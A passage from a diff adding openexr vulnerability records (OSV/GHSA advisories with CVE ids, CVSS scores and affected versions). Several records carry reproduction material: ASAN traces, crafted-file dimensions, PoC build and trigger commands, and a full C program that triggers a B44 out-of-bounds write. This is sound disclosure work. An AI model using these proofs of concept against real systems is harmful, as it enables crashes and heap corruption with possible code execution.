(/home/pop/sec/openexr/build-asan/bin/exrcheck+0xe844) (BuildId: 087c972343a5372940c42c0a2e7bce4a84288aec)\n\nSUMMARY: AddressSanitizer: heap-buffer-overflow /home/pop/sec/openexr/src/lib/OpenEXRCore/internal_piz.c:148 in wdec14_4\nShadow bytes around the buggy address:\n  0x7bedc3934480: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n  0x7bedc3934500: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n  0x7bedc3934580: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n  0x7bedc3934600: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n  0x7bedc3934680: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n=>0x7bedc3934700:[fa]fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n  0x7bedc3934780: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n  0x7bedc3934800: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  0x7bedc3934880: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  0x7bedc3934900: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  0x7bedc3934980: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\nShadow byte legend (one shadow byte represents 8 application bytes):\n  Addressable:           00\n  Partially addressable: 01 02 03 04 05 06 07\n  Heap left redzone:       fa\n  Freed heap region:       fd\n  Stack left redzone:      f1\n  Stack mid redzone:       f2\n  Stack right redzone:     f3\n  Stack after return:      f5\n  Stack use after scope:   f8\n  Global redzone:          f9\n  Global init order:       f6\n  Poisoned by user:        f7\n  Container overflow:      fc\n  Array cookie:            ac\n  Intra object redzone:    bb\n  ASan internal:           fe\n  Left alloca redzone:     ca\n  Right alloca redzone:    cb\n==1711239==ABORTING\n```\n\nTo prove this is both READ and WRITE, we can also `memcheck` against non-ASAN release build:\n\n```sh\nvalgrind --tool=memcheck --leak-check=no --track-origins=no \\\n  --error-limit=no --num-callers=20 \\\n  ./build-relwithdebinfo/bin/exrcheck /tmp/piz_scanline_redzone.exr\n```\n\nObserved result:\n\n- `Invalid read of size 2` at [internal_piz.c:150](/home/pop/sec/openexr/src/lib/OpenEXRCore/internal_piz.c#L150)\n- `Invalid write of size 2` at [internal_piz.c:171](/home/pop/sec/openexr/src/lib/OpenEXRCore/internal_piz.c#L171)\n\nThis confirms the bug is an OOB read/write, not only a read-first crash.\n\n### Redzone-Oriented File\n\n- width: `67108862`\n- height: `32`\n- channel A: `FLOAT`, sampling `1 x 1`\n- channel B: `HALF`, sampling `33554431 x 16`\n\nThis makes:\n\n```text\nwidth * 32 * 2 = 4294967168\n```\n\nwhich wraps signed 32-bit arithmetic to `-128`.\n\nThat places the next `wavbuf` access just before the allocated buffer, producing a clean heap-overflow report.\n\n## Impact\n\nA crafted EXR file can trigger out-of-bounds memory access during PIZ decompression. The primitive includes both invalid reads and invalid writes. Depending on allocator layout and surrounding memory, this could lead to process crash, memory corruption, or potentially stronger exploitation outcomes.\n\n## Recommended Fix\n\n- compute channel span in 64-bit arithmetic\n- reject any overflow in `nx * ny * wcount`\n- validate cumulative per-channel decoded footprint against `outsz` before wavelet decode\n- fail decompression if channel-derived layout does not exactly fit the decompression buffer\n--------\nFound by: Quang Luong of Calif.io",
+      "published": "2026-04-08T15:09:01Z",
+      "modified": "2026-04-08T15:18:15.760077Z",
+      "severity": {
+        "type": "CVSS_V4",
+        "score": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N"
+      },
+      "all_severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"
+        },
+        {
+          "type": "CVSS_V4",
+          "score": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N"
+        }
+      ],
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/AcademySoftwareFoundation/openexr/security/advisories/GHSA-588r-cr5c-w6hf"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-34588"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/AcademySoftwareFoundation/openexr"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/AcademySoftwareFoundation/openexr/releases/tag/v3.2.7"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/AcademySoftwareFoundation/openexr/releases/tag/v3.3.9"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/AcademySoftwareFoundation/openexr/releases/tag/v3.4.9"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/GHSA-588r-cr5c-w6hf",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "3.1.0"
+            },
+            {
+              "fixed": "3.2.7"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "3.2.3",
+        "3.2.4",
+        "3.2.5",
+        "3.2.6"
+      ],
+      "affected_conda_versions": [
+        "3.3.2",
+        "3.3.3",
+        "3.3.4",
+        "3.3.5",
+        "3.4.0",
+        "3.4.4",
+        "3.4.5",
+        "3.4.6",
+        "3.4.7",
+        "3.4.8"
+      ]
+    },
+    {
+      "id": "GHSA-8m57-j273-2qg9",
+      "primary_id": "CVE-2017-9112",
+      "aliases": [
+        "CVE-2017-9112"
+      ],
+      "cve_ids": [
+        "CVE-2017-9112"
+      ],
+      "ecosystem": "PyPI",
+      "upstream_name": "openexr",
+      "summary": "OpenEXR invalid read",
+      "details": "In OpenEXR 2.2.0, an invalid read of size 1 in the getBits function in ImfHuf.cpp could cause the application to crash.",
+      "published": "2022-05-13T01:17:50Z",
+      "modified": "2025-04-22T19:12:05.682027Z",
+      "severity": {
+        "type": "CVSS_V3",
+        "score": "CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H"
+      },
+      "all_severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H"
+        }
+      ],
+      "references": [
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2017-9112"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/openexr/openexr/issues/232"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/openexr/openexr/pull/233"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/AcademySoftwareFoundation/openexr"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/openexr/openexr/releases/tag/v2.2.1"
+        },
+        {
+          "type": "WEB",
+          "url": "https://lists.debian.org/debian-lts-announce/2020/08/msg00056.html"
+        },
+        {
+          "type": "WEB",
+          "url": "https://usn.ubuntu.com/4148-1"
+        },
+        {
+          "type": "WEB",
+          "url": "http://www.openwall.com/lists/oss-security/2017/05/12/5"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/GHSA-8m57-j273-2qg9",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "2.2.1"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "1.0.2",
+        "1.0.3",
+        "1.1.0",
+        "1.2.0",
+        "1.3.0",
+        "1.3.1",
+        "1.3.2",
+        "1.3.7",
+        "1.3.8",
+        "1.3.9"
+      ],
+      "affected_conda_versions": [
+        "1.3.2",
+        "1.3.7",
+        "1.3.8",
+        "1.3.9"
+      ]
+    },
+    {
+      "id": "GHSA-cr4v-6jm6-4963",
+      "primary_id": "CVE-2026-27622",
+      "aliases": [
+        "CVE-2026-27622"
+      ],
+      "cve_ids": [
+        "CVE-2026-27622"
+      ],
+      "ecosystem": "PyPI",
+      "upstream_name": "openexr",
+      "summary": "OpenEXR's CompositeDeepScanLine integer-overflow leads to heap OOB write",
+      "details": "## Summary\n\nFunction: `CompositeDeepScanLine::readPixels`, reachable from high-level multipart deep read flows (`MultiPartInputFile` + `DeepScanLineInputPart` + `CompositeDeepScanLine`).\n\nVulnerable lines (`src/lib/OpenEXR/ImfCompositeDeepScanLine.cpp`):\n- `total_sizes[ptr] += counts[j][ptr];` (line ~511)\n- `overall_sample_count += total_sizes[ptr];` (line ~514)\n- `samples[channel].resize (overall_sample_count);` (line ~535)\n\nImpact: 32-bit sample-count accumulation wrap leads to undersized allocation, then decode writes with true sample volume, causing heap OOB write in `generic_unpack_deep_pointers` (`src/lib/OpenEXRCore/unpack.c:1374`) (DoS/Crash, memory corruption/RCE).\n\nAttack scenario:\n- Attacker provides multipart deep EXR with many parts and very large sample counts per pixel.\n- Uses compression (RLE/ZIPS) to keep file size relatively small vs decode pressure.\n- The overflow happens in composite sample accounting (`unsigned int`), while pointer progression for decode uses larger counters and reaches out-of-bounds.\n\nTested on: `OpenEXR 4.0.0-dev` (commit 83449669402080874b25ff1fa740649a9e6ea064) but this code has existed since v2.3.0\n\n## Steps to reproduce\n\n[composite_deepscanline_poc_bundle.patch](https://github.com/user-attachments/files/25383205/composite_deepscanline_poc_bundle.patch)\n\nPoC files used:\n- Writer/generator: `poc/composite_deep_scanline_e2e_compressed_poc.cpp`\n- Minimal high-level reader harness: `poc/simple_exr_reader.cpp`\n\nThe reader harness intentionally mimics realistic app behavior: open EXR, iterate parts, select `DEEPSCANLINE`, add sources to `CompositeDeepScanLine`, bind a normal `FrameBuffer`, then call `readPixels`.\n\nBuild with ASAN/UBSAN:\n\n```bash\ncmake -S . -B build-asan \\\n  -DOPENEXR_BUILD_POC=ON \\\n  -DCMAKE_BUILD_TYPE=RelWithDebInfo \\\n  -DCMAKE_C_FLAGS='-fsanitize=address,undefined -fno-omit-frame-pointer' \\\n  -DCMAKE_CXX_FLAGS='-fsanitize=address,undefined -fno-omit-frame-pointer' \\\n  -DCMAKE_EXE_LINKER_FLAGS='-fsanitize=address,undefined' \\\n  -DCMAKE_SHARED_LINKER_FLAGS='-fsanitize=address,undefined'\n\ncmake --build build-asan --target composite_writer simple_exr_reader -j\n```\n\nGenerate malicious file (decode-path focused profile):\n\n```bash\nASAN_OPTIONS=detect_leaks=0 timeout 180s \\\n  ./build-asan/poc/composite_writer \\\n  --profile low-ram \\\n  --file /tmp/composite_decode_focus.exr\n```\n\nTrigger:\n\n```bash\nASAN_OPTIONS=detect_leaks=0 timeout 30s \\\n  ./build-asan/poc/simple_exr_reader /tmp/composite_decode_focus.exr\n```\n\nASAN builds are slower. If needed, a non-sanitized build + debugger is faster for iteration.\n\n## Example runs\n\nWriter (abbrev):\n\n```bash\n\u276f ./build-asan/poc/composite_writer\nexploit math:\n  benign samples                 : 300\n  malicious parts                : 86\n  malicious samples per part     : 50000000\n  true total samples             : 4300000300\n  uint32 overflow reached        : yes\n  wrapped uint32 total           : 5033004\n  composite Z/A alloc from wrap  : 40264032 bytes (38.40 MiB)\n  per-part unpacked sample bytes : 300000000 bytes (286.10 MiB)\n  min parts to overflow (current benign/samples): 86\nwriting compressed multipart deep EXR: /tmp/composite_deep_scanline_e2e_compressed.exr\nwriting donor malicious part (50000000 samples)\ncopying malicious part 1/86 from donor chunk\n...\nfile size: 26112896 bytes (24.90 MiB)\n```\n\nReader ASAN crash:\n\n```bash\n\u276f ./build-asan/poc/simple_exr_reader\nreading /tmp/composite_overflow_optimized.exr with 16 deepscanline parts\n=================================================================\n==175024==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x7ed1a55d90b0 at pc 0x7ed1da7854f7 bp 0x7ffe8c83a680 sp 0x7ffe8c83a670\nWRITE of size 4 at 0x7ed1a55d90b0 thread T0\n    #0 0x7ed1da7854f6 in generic_unpack_deep_pointers /home/pop/sec/openexr/src/lib/OpenEXRCore/unpack.c:1374\n    #1 0x7ed1da7623e9 in exr_decoding_run /home/pop/sec/openexr/src/lib/OpenEXRCore/decoding.c:664\n    #2 0x7ed1dbcb153b in run_decode /home/pop/sec/openexr/src/lib/OpenEXR/ImfDeepScanLineInputFile.cpp:816\n    #3 0x7ed1dbcc597f in Imf_4_0::DeepScanLineInputFile::Data::readData(Imf_4_0::DeepFrameBuffer const&, int, int, bool) /home/pop/sec/openexr/src/lib/OpenEXR/ImfDeepScanLineInputFile.cpp:568\n    #4 0x7ed1dbc01ca4 in Imf_4_0::CompositeDeepScanLine::readPixels(int, int) /home/pop/sec/openexr/src/lib/OpenEXR/ImfCompositeDeepScanLine.cpp:576\n    #5 0x64669005f233 in main /home/pop/sec/openexr/poc/simple_exr_reader.cpp:88\n    #6 0x7ed1d942a1c9 in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58\n    #7 0x7ed1d942a28a in __libc_start_main_impl ../csu/libc-start.c:360\n    #8 0x6466900601e4 in _start (/home/pop/sec/openexr/build-asan/poc/simple_exr_reader+0x1b1e4) (BuildId: 86b018d0dce48def6ca06be031266f0205c914d2)\n\n0x7ed1a55d90b0 is located 0 bytes after 820132016-byte region [0x7ed1747b5800,0x7ed1a55d90b0)\nallocated by thread T0 here:\n    #0 0x7ed1dd0fe548 in operator new(unsigned long) ../../../../src/libsanitizer/asan/asan_new_delete.cpp:95\n    #1 0x7ed1dbc29600 in std::__new_allocator<float>::allocate(unsigned long, void const*) /usr/include/c++/13/bits/new_allocator.h:151\n    #2 0x7ed1dbc29600 in std::allocator_traits<std::allocator<float> >::allocate(std::allocator<float>&, unsigned long) /usr/include/c++/13/bits/alloc_traits.h:482\n    #3 0x7ed1dbc29600 in std::_Vector_base<float, std::allocator<float> >::_M_allocate(unsigned long) /usr/include/c++/13/bits/stl_vector.h:381\n    #4 0x7ed1dbc29600 in std::_Vector_base<float, std::allocator<float> >::_M_allocate(unsigned long) /usr/include/c++/13/bits/stl_vector.h:378\n    #5 0x7ed1dbc29600 in std::vector<float, std::allocator<float> >::_M_default_append(unsigned long) /usr/include/c++/13/bits/vector.tcc:663\n    #6 0x7ed1dbc00184 in std::vector<float, std::allocator<float> >::resize(unsigned long) /usr/include/c++/13/bits/stl_vector.h:1016\n    #7 0x7ed1dbc00184 in Imf_4_0::CompositeDeepScanLine::readPixels(int, int) /home/pop/sec/openexr/src/lib/OpenEXR/ImfCompositeDeepScanLine.cpp:535\n    #8 0x64669005f233 in main /home/pop/sec/openexr/poc/simple_exr_reader.cpp:88\n    #9 0x7ed1d942a1c9 in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58\n    #10 0x7ed1d942a28a in __libc_start_main_impl ../csu/libc-start.c:360\n    #11 0x6466900601e4 in _start (/home/pop/sec/openexr/build-asan/poc/simple_exr_reader+0x1b1e4) (BuildId: 86b018d0dce48def6ca06be031266f0205c914d2)\n\nSUMMARY: AddressSanitizer: heap-buffer-overflow /home/pop/sec/openexr/src/lib/OpenEXRCore/unpack.c:1374 in generic_unpack_deep_pointers\nShadow bytes around the buggy address:\n  0x7ed1a55d8e00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  0x7ed1a55d8e80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  0x7ed1a55d8f00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  0x7ed1a55d8f80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n  0x7ed1a55d9000: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n=>0x7ed1a55d9080: 00 00 00 00 00 00[fa]fa fa fa fa fa fa fa fa fa\n  0x7ed1a55d9100: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n  0x7ed1a55d9180: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n  0x7ed1a55d9200: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n  0x7ed1a55d9280: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n  0x7ed1a55d9300: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\nShadow byte legend (one shadow byte represents 8 application bytes):\n  Addressable:           00\n  Partially addressable: 01 02 03 04 05 06 07\n  Heap left redzone:       fa\n  Freed heap region:       fd\n  Stack left redzone:      f1\n  Stack mid redzone:       f2\n  Stack right redzone:     f3\n  Stack after return:      f5\n  Stack use after scope:   f8\n  Global redzone:          f9\n  Global init order:       f6\n  Poisoned by user:        f7\n  Container overflow:      fc\n  Array cookie:            ac\n  Intra object redzone:    bb\n  ASan internal:           fe\n  Left alloca redzone:     ca\n  Right alloca redzone:    cb\n==175024==ABORTING\n```\n\n## Root cause analysis\n\nIn `CompositeDeepScanLine::readPixels`:\n\n1. Per-pixel totals are accumulated in `vector<unsigned int> total_sizes`.\n2. For attacker-controlled large counts across many parts, `total_sizes[ptr]` wraps modulo `2^32`.\n3. `overall_sample_count` is then derived from wrapped totals and used in `samples[channel].resize(overall_sample_count)`.\n4. Decode pointer setup/consumption proceeds with true sample counts, and write operations in core unpack (`generic_unpack_deep_pointers`) overrun the undersized composite sample buffer.\n\n\nAllocation is based on a tiny wrapped value, but decode writes correspond to the true large sample volume.\n\n## Impact\n\nHeap OOB write during decode. This is at minimum a reliable crash/DoS. As heap corruption, this bug could be used for potential remote code execution.",
+      "published": "2026-03-02T18:30:20Z",
+      "modified": "2026-03-04T15:13:59.582495Z",
+      "severity": {
+        "type": "CVSS_V4",
+        "score": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:A/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N"
+      },
+      "all_severity": [
+        {
+          "type": "CVSS_V4",
+          "score": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:A/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N"
+        }
+      ],
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/AcademySoftwareFoundation/openexr/security/advisories/GHSA-cr4v-6jm6-4963"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-27622"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/AcademySoftwareFoundation/openexr"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/GHSA-cr4v-6jm6-4963",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "2.3.0"
+            },
+            {
+              "fixed": "3.2.6"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "3.2.3",
+        "3.2.4",
+        "3.2.5"
+      ],
+      "affected_conda_versions": [
+        "3.3.2",
+        "3.3.3",
+        "3.3.4",
+        "3.3.5",
+        "3.4.0",
+        "3.4.4",
+        "3.4.5"
+      ]
+    },
+    {
+      "id": "GHSA-h45x-qhg2-q375",
+      "primary_id": "CVE-2025-48071",
+      "aliases": [
+        "CVE-2025-48071"
+      ],
+      "cve_ids": [
+        "CVE-2025-48071"
+      ],
+      "ecosystem": "PyPI",
+      "upstream_name": "openexr",
+      "summary": "OpenEXR Heap-Based Buffer Overflow in Deep Scanline Parsing via Forged Unpacked Size",
+      "details": "### Summary\n\nThe OpenEXRCore code is vulnerable to a heap-based buffer overflow during a write operation when decompressing ZIPS-packed deep scan-line EXR files with a maliciously forged chunk header.\n\n### Details\nWhen parsing `STORAGE_DEEP_SCANLINE` chunks from an EXR file, the following code (from `src/lib/OpenEXRCore/chunk.c`) is used to extract the chunk information:\n\n```cpp\n\nif (part->storage_mode == EXR_STORAGE_DEEP_SCANLINE)\n// SNIP...\n        cinfo->sample_count_data_offset = dataoff;\n        cinfo->sample_count_table_size  = (uint64_t) ddata[0];\n        cinfo->data_offset              = dataoff + (uint64_t) ddata[0];\n        cinfo->packed_size              = (uint64_t) ddata[1];\n        cinfo->unpacked_size            = (uint64_t) ddata[2];\n// SNIP...\n```\n\nBy storing this information, the code that will later decompress and reconstruct the chunk bytes, will know how much space the uncompressed data will occupy.\n\nThis size is carried along in the chain of decoding/decompression until the `undo_zip_impl` function in `src/lib/OpenEXRCore/internal_zip.c`:\n\n```cpp\nstatic exr_result_t\nundo_zip_impl (\n    exr_decode_pipeline_t* decode,\n    const void*            compressed_data,\n    uint64_t               comp_buf_size,\n    void*                  uncompressed_data,\n    uint64_t               uncompressed_size,\n    void*                  scratch_data,\n    uint64_t               scratch_size)\n{\n    size_t       actual_out_bytes;\n    exr_result_t res;\n\n    if (scratch_size < uncompressed_size) return EXR_ERR_INVALID_ARGUMENT;\n\n    res = exr_uncompress_buffer (\n        decode->context,\n        compressed_data,\n        comp_buf_size,\n        scratch_data,\n        scratch_size,\n        &actual_out_bytes);\n\n    if (res == EXR_ERR_SUCCESS)\n    {\n        decode->bytes_decompressed = actual_out_bytes;\n        if (comp_buf_size > actual_out_bytes)\n            res = EXR_ERR_CORRUPT_CHUNK;\n        else\n            internal_zip_reconstruct_bytes (\n                uncompressed_data, scratch_data, actual_out_bytes);\n    }\n\n    return res;\n}\n```\n\nThe `uncompressed_size`\u00a0comes from the `unpacked_size`\u00a0extracted earlier, and the `uncompressed_data` is a buffer allocated by making space for the size \"advertised\" in the chunk information.\n\nHowever, `scratch_data` and `actual_out_bytes` will contain, after decompression, the uncompressed data and its size, respectively. \n\nThe vulnerability lies in the fact that the `undo_zip_impl` function lacks code to check whether `actual_out_bytes` is greater than `uncompressed_size`. \n\nThe effect is that, by setting the `unpacked_size` in the chunk header smaller than the actual chunk decompressed data, it is possible - in the `internal_zip_reconstruct_bytes` function - to overflow past the boundaries of a heap chunk.\n\n### PoC\n\nNOTE: you can download the `heap_overflow.exr` file from this link:\n\nhttps://github.com/ShielderSec/poc/tree/main/CVE-2025-48071\n\n1. Compile the `exrcheck` binary in a macOS or GNU/Linux machine with ASAN.\n2. Open the `heap_overflow.exr` file with the following command:\n\n```\nexrcheck heap_overflow.exr\n```\n\n3. Notice that `exrcheck` crashes with an ASAN stack-trace.\n![image](https://github.com/user-attachments/assets/57907073-bc9f-40bb-9030-16008035ade8)\n\n### Impact\n\nAn attacker might exploit this vulnerability by feeding a maliciously crafted file to a program that uses the OpenEXR libraries, thus gaining the capability to write an arbitrary amount of bytes in the heap. This could potentially result in code execution in the process.",
+      "published": "2025-07-31T19:12:56Z",
+      "modified": "2025-08-13T22:17:20.853898Z",
+      "severity": {
+        "type": "CVSS_V4",
+        "score": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:A/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N"
+      },
+      "all_severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H"
+        },
+        {
+          "type": "CVSS_V4",
+          "score": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:A/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N"
+        }
+      ],
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/AcademySoftwareFoundation/openexr/security/advisories/GHSA-h45x-qhg2-q375"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-48071"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/AcademySoftwareFoundation/openexr/commit/916cc729e24aa16b86d82813f6e136340ab2876f"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/AcademySoftwareFoundation/openexr"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/AcademySoftwareFoundation/openexr/releases/tag/v3.3.3"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/ShielderSec/poc/tree/main/CVE-2025-48071"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/GHSA-h45x-qhg2-q375",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "3.3.0"
+            },
+            {
+              "fixed": "3.3.3"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "3.3.0",
+        "3.3.1",
+        "3.3.2"
+      ],
+      "affected_conda_versions": [
+        "3.3.2"
+      ]
+    },
+    {
+      "id": "GHSA-h762-rhv3-h25v",
+      "primary_id": "CVE-2026-34544",
+      "aliases": [
+        "CVE-2026-34544"
+      ],
+      "cve_ids": [
+        "CVE-2026-34544"
+      ],
+      "ecosystem": "PyPI",
+      "upstream_name": "openexr",
+      "summary": "OpenEXR: integer overflow to OOB write in uncompress_b44_impl()",
+      "details": "### Summary\nThe B44/B44A decoder in OpenEXR reconstructs row pointers into a scratch buffer using int. When the channel width (nx) is large enough, the product y * nx overflows int, causing the row pointer to wrap before the start of the scratch buffer. Subsequent memcpy() calls then write decoded pixel blocks to an invalid address, producing an active out-of-bounds write.\n\n### Root cause \n* Variable declarations (internal_b44.c:535)\n```c\nint nx, ny;\n```\n`nx` and `ny` are declared as plain int. They are assigned from `curc->width` and `curc->height` which are int32_t.\n\n* Scratch buffer allocation (internal_b44:543)\n```c\nnBytes = (uint64_t) (ny) * (uint64_t) (nx) *\n               (uint64_t) (curc->bytes_per_element);\n```\nThe allocation path correctly promotes to uint64_t before multiplying.\nThe scratch buffer is always large enough to hold the full channel.\n\n* Row pointer reconstruction (internal_b44:560)\n```c\nrow0 = (uint16_t*) scratch;\nrow0 += y * nx;          \nrow1 = row0 + nx;\nrow2 = row1 + nx;\nrow3 = row2 + nx;\n```\n`y` and `nx` are both int. The product `y * nx` is computed in int. If this product exceeds INT_MAX (2,147,483,647), the result is signed integer overflow\n\n* Out of Band write (internal_b44:592)\n```c\nmemcpy (row0, &s[0], n);\nmemcpy (row1, &s[4], n);\nmemcpy (row2, &s[8], n);\nmemcpy (row3, &s[12], n);\n```\nThese four writes copy decoded B44 pixel blocks into row0\u2013row3, which now point to memory before the scratch buffer. \nThe same pattern is present in the encoder path (ht_apply_impl), lines 431\u2013432, where row0\u2013row3 are read rather than written, producing an out-of-bounds read.\n\n### PoC\nThe PoC generates a valid B44 scanline EXR file (268435456 \u00d7 9, single HALF channel) and immediately decodes it. During decompression, uncompress_b44_impl() computes `row0 += y * nx`, with y=8 and nx=268435456, the product exceeds INT_MAX, triggering a signed integer overflow that displaces row0 before the scratch buffer. The subsequent memcpy() writes to this invalid address, causing the crash. The generated file /tmp/poc_b44.exr can be replayed independently on any OpenEXR installation.\n```poc.cpp\n#include <openexr.h>\n#include <inttypes.h>\n#include <stdint.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\n#define CHECK(call)                                                  \n    do {                                                             \n        exr_result_t _rv = (call);                                   \n        if (_rv != EXR_ERR_SUCCESS) {                                \n            fprintf(stderr, \"%s failed (%d)\\n\", #call, (int)_rv);   \n            goto fail;                                               \n        }                                                            \n    } while (0)\n\nstatic void fill_blocks(uint8_t* out, uint64_t n) {\n    for (uint64_t i = 0; i < n; i++, out += 3) {\n        out[0] = 0x00; out[1] = 0x00; out[2] = (13u << 2);\n    }\n}\n\nint main(void) {\n    const int64_t  W      = 268435456;\n    const int64_t  H      = 9;\n    const char*    path   = \"/tmp/poc_b44.exr\";\n\n    const uint64_t blocks = (uint64_t)(W / 4) * 2 + 1;\n    const uint64_t psz    = blocks * 3;\n\n    uint8_t* packed = (uint8_t*) malloc(psz);\n    exr_context_t         ctxt   = NULL;\n    exr_context_initializer_t cinit = EXR_DEFAULT_CONTEXT_INITIALIZER;\n    int                   part   = -1;\n    exr_chunk_info_t      cinfo;\n    exr_decode_pipeline_t dec    = EXR_DECODE_PIPELINE_INITIALIZER;\n    uint16_t              dummy  = 0;\n    int                   ok     = 0;\n\n    if (!packed) { fprintf(stderr, \"malloc failed\\n\"); return 1; }\n    fill_blocks(packed, blocks);\n\n    CHECK(exr_start_write(&ctxt, path, EXR_WRITE_FILE_DIRECTLY, &cinit));\n    CHECK(exr_add_part(ctxt, \"scan\", EXR_STORAGE_SCANLINE, &part));\n    CHECK(exr_initialize_required_attr_simple(\n              ctxt, part, (int32_t)W, (int32_t)H, EXR_COMPRESSION_B44));\n    CHECK(exr_add_channel(ctxt, part, \"Y\", EXR_PIXEL_HALF,\n                          EXR_PERCEPTUALLY_LOGARITHMIC, 1, 1));\n    CHECK(exr_write_header(ctxt));\n    CHECK(exr_write_scanline_chunk(ctxt, part, 0, packed, psz));\n    exr_finish(&ctxt); ctxt = NULL;\n\n    fprintf(stderr, \"[*] wrote %s  W=%\"PRId64\" H=%\"PRId64 \"  packed=%\"PRIu64\" bytes\\n\", path, W, H, psz);\n\n\n    CHECK(exr_start_read(&ctxt, path, &cinit));\n    CHECK(exr_read_scanline_chunk_info(ctxt, 0, 0, &cinfo));\n    CHECK(exr_decoding_initialize(ctxt, 0, &cinfo, &dec));\n\n    dec.channels[0].decode_to_ptr          = (uint8_t*)&dummy;\n    dec.channels[0].user_pixel_stride      = 2;\n    dec.channels[0].user_line_stride       = dec.channels[0].width * 2;\n    dec.channels[0].user_bytes_per_element = 2;\n    dec.channels[0].user_data_type         = dec.channels[0].data_type;\n\n    CHECK(exr_decoding_choose_default_routines(ctxt, 0, &dec));\n    dec.unpack_and_convert_fn = NULL; \n\n    fprintf(stderr, \"[*] calling exr_decoding_run()h\\n\");\n    fflush(stderr);\n\n\n    CHECK(exr_decoding_run(ctxt, 0, &dec));\n    ok = 1;\n\nfail:\n    if (ctxt) { exr_decoding_destroy(ctxt, &dec); exr_finish(&ctxt); }\n    free(packed);\n    return ok ? 0 : 1;\n}\n```\n### ASAN Trace\n```\nopenexr/src/lib/OpenEXRCore/internal_b44.c:561:23: runtime error:\n    signed integer overflow: 8 * 268435456 cannot be represented in type 'int'\n    #0 in uncompress_b44_impl  internal_b44.c:561\n    #1 in internal_exr_undo_b44  internal_b44.c:706\n    #2 in decompress_data  compression.c:444\n    #3 in 